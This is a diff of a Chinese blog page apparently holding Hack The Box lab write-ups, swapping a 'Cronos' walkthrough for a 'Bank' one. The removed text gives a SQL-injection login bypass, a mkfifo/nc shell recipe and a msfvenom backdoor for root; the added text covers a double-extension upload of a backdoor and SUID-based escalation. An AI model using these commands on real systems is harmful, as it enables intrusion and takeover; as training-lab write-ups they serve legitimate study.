@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>htb之Cronos | Hexo</title>
+  <title>htb之bank | Hexo</title>
   <meta name="keywords" content=" 博客 , htb ">
-  <meta name="description" content="htb之Cronos | Hexo">
+  <meta name="description" content="htb之bank | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Networkednmap 一波 10.10.10.146开放着80端口和22端口 目录扫描一下，直接把源码给扫出来了，直接就代码审查，只发现有一个上传功能抓包修改参数，没啥好说的，上传的艺术双重后缀，头文件绕过GIF89a喜获一个webshell，但是没什么用，user.txt都看不了，好吧起码撕开的一个口子打开/home发现有一个定时任务，还有一个PHP脚本，发现它会在一个目录下检测非">
 <meta name="keywords" content="博客,htb">
@@ -297,9 +297,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-htb之Cronos" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之bank" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">htb之Cronos</h1>
+        <h1 class="article-title">htb之bank</h1>
     
     <div class="article-meta">
         
@@ -323,7 +323,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-15 17:02:21'>2019-10-11 09:40</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-14 14:56:29'>2019-11-14 14:39</time>
         
     </div>
     <div class="article-meta">
@@ -345,7 +345,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Cronos"><span class="toc-text">htb之Cronos</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap收集信息"><span class="toc-text">nmap收集信息</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -361,25 +361,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="htb之Cronos"><a href="#htb之Cronos" class="headerlink" title="htb之Cronos"></a>htb之Cronos</h1><blockquote>
-<p>nmap 收集一下信息 10.10.10.13<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>发现开放着80端口，但又同时开放着53端口，可能是做了域名解析，尝试直接访问80,果然看不到任何东西<br><img src="/images/21.png" alt><br>使用dig问一下dns域名服务器<br>dig axfr @10.10.10.13 cronos.htb<br><img src="/images/22.png" alt><br>修改/etc/hosts 把admin.cronos.htb添加进去<br><img src="/images/23.png" alt><br>直接访问admin.cronos.htb 就可看到一个登陆窗口<br>sql注入admin’– -<br>进去之后一个就可以看到很明显的命令行注入<br><img src="/images/24.png" alt><br>那就直接nc连接吧，因为是server端的原因，不能直接插入，要委婉一点，要点前戏<br>在server端:<br>$ rm -f /tmp/f; mkfifo /tmp/f<br>$ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f</p>
-</blockquote>
-<p>在client端:</p>
+        <h1 id="nmap收集信息"><a href="#nmap收集信息" class="headerlink" title="nmap收集信息"></a>nmap收集信息</h1><p><img src="/image/bank/1.png" alt><br>发现开有53端口和80端口，htb尿性<br>直接添加/etc/hosts bank.htb<br>直接打开bank.htb就是一个硕大的登录框，dirb目录扫描，发现一个很诡异的目录<br><a href="http://bank.htb/support.php" target="_blank" rel="noopener">http://bank.htb/support.php</a> 302 打开这个就一直跳向登录框，被重定向了吗<br><img src="/image/bank/2.png" alt><br>用浏览器插件禁止重定向<br><img src="/image/bank/3.png" alt><br>打开<a href="http://bank.htb/support.php" target="_blank" rel="noopener">http://bank.htb/support.php</a> 就是一个上传框，直接传上后门<br>经过测试双重后缀就可绕过上传限制<br><img src="/image/bank/4.png" alt><br>上传完之后，文件直接就在上传点那<br><img src="/image/bank/5.png" alt></p>
 <blockquote>
-<p>$ nc host.example.com 1234<br>$ (shell prompt from host.example.com)</p>
+<p>find / -perm -4000 2&gt;/dev/nell</p>
 </blockquote>
-<p>通过创建一个FIFO文件/tmp/f，让nc在server端127.0.0.1的端口1234上监听，当一个client成功连接之后，/bin/sh在服务端执行，但执行反馈传送给client端。<br>当连接中断后，nc也退出。如果要保持连接，使用-k选项，但是如果命令退出，这个选项也不会重启它或保持nc运行。如果不再需要，不要忘记删除该文件描述符。</p>
-<blockquote>
-<p>$ rm -f /tmp/f</p>
-</blockquote>
-<p>接下来就是提权了<br>（因为shell不是完整的shell，下列提升为完整shell</p>
-<blockquote>
-<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’ python伪终端<br> ctrl + Z 后台挂起<br>stty raw -echo<br>export SHELL=bash<br>export TERM=xterm256-color<br>stty rows 38 columns 116  )</p>
-</blockquote>
-<p>ok, 一个相对来说完整的shell<br>LinEnum:  <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a><br>linux 提权脚本跑到定时任务里有个php脚本可执行<br>正常来说只要读取到/root/root.txt ，这个靶机就算打完了<br>可能是因为我菜吧，在脚本里写cat /root/root.txt &gt; /var/www/admin/123.txt<br>硬是复制不出来，无奈只好含泪提权</p>
-<blockquote>
-<p>chown root:root /tmp/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf<br>msfvenom 开了个后门，直接回弹root权限<br>nice！</p>
-</blockquote>
+<p>直接利用find查找具有root权限的文件<br>发现/var/htb/bin/emergency<br>直接执行之后便具有root权限</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -389,12 +375,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>htb之Cronos</p>
+    <p><span class="copy-title">文章标题:</span>htb之bank</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-11, 09:40:43</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-15, 17:02:21</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/11/htb之Cronos/" title="htb之Cronos">https://manmachines.github.io/2019/10/11/htb之Cronos/</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-14, 14:39:45</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-14, 14:56:29</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/14/htb之bank/" title="htb之bank">https://manmachines.github.io/2019/11/14/htb之bank/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
